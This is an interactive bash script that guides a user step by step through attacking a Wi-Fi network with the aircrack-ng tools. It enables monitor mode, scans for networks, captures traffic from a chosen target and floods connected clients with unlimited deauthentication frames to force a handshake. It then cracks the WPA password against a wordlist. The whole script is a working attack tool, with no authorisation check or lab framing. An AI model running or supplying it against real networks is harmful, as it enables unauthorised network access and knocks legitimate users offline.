#!/bin/bash

function continue_or_quit() {
    while true; do
        read -p "Do you want to continue (y/n)? " choice
        if [[ "$choice" =~ ^[yY]$ ]]; then
            return 0  # Continue the process
        elif [[ "$choice" =~ ^[nN]$ ]]; then
            exit 0  # Exit the script
        else
            echo "Invalid choice. Please type 'y' to continue or 'n' to quit."
        fi
    done
}

function display_steps() {
    echo "Step 1: Identify and Configure Wireless Adapter"
    echo "Step 2: Enable Monitor Mode"
    echo "Step 3: Kill Interfering Processes"
    echo "Step 4: Scan and Target Network"
    echo "Step 5: Deauthenticate Clients (Part of Step 4)"
    echo "Step 6: Crack the Password"
    echo "Step 7: Complete the Process"
}

# Ask the user once at the beginning for the step to start from
echo "Hello, there:"
echo "I will guide you through this operation. You can start from any step between 1 and 7."
display_steps
read -p "Enter the step number you want to start from (1-7): " start_step

# Validate input
if [[ ! "$start_step" =~ ^[1-7]$ ]]; then
    echo "Invalid choice. Please enter a number between 1 and 7."
    exit 1
fi

# Start the process from the chosen step
for input in $(seq "$start_step" 7); do

    # Step 1: Identify and Configure Wireless Adapter
    if [ "$input" -eq 1 ]; then
        iwconfig
        echo "Identifying wireless adapter for scanning the network."
        read -p "Enter the name of the wireless adapter to use: " input_wlan
        if ! iwconfig | grep -q "$input_wlan"; then
            echo "The wireless adapter $input_wlan was not found. Please check and try again."
            exit 1
        fi
    fi

    # Step 2: Enable Monitor Mode
    if [ "$input" -eq 2 ]; then
        echo "Enabling monitor mode..."
        sudo airmon-ng start "$input_wlan"
        if [[ $? -ne 0 ]]; then
            echo "Failed to enable monitor mode. Please check the wireless adapter."
            exit 1
        fi
    fi

    # Step 3: Kill Interfering Processes
    if [ "$input" -eq 3 ]; then
        echo "Killing interfering processes..."
        sudo airmon-ng check kill
        if [[ $? -ne 0 ]]; then
            echo "Failed to kill processes. Please check if there are any issues."
            exit 1
        fi
    fi

    # Step 4 & 5: Scan and Target Network and Deauthenticate Clients
    if [ "$input" -eq 4 ]; then
        echo "Scanning for networks..."
        sudo airodump-ng "${input_wlan}mon"
        read -p "Enter the target BSSID: " MAC
        read -p "Enter the target Channel (CH): " CH
        sudo airodump-ng "${input_wlan}mon" -w ~/Desktop/hack1 -c "$CH" --bssid "$MAC" &
        echo "Deauthenticating clients from the network..."
        sudo aireplay-ng --deauth 0 -a "$MAC" "${input_wlan}mon"
    fi

    # Step 6: Crack the Password
    if [ "$input" -eq 6 ]; then
        echo "Starting the password cracking process..."
        read -p "Enter the path of the file to crack: " crack_file
        read -p "Enter the path of the wordlist: " wordlist
        sudo aircrack-ng "$crack_file" -w "$wordlist"
    fi

    # Step 7: Complete the Process
    if [ "$input" -eq 7 ]; then
        echo "All steps have been completed. Review your results."
        echo "Exiting the guide."
        exit 0
    fi

done
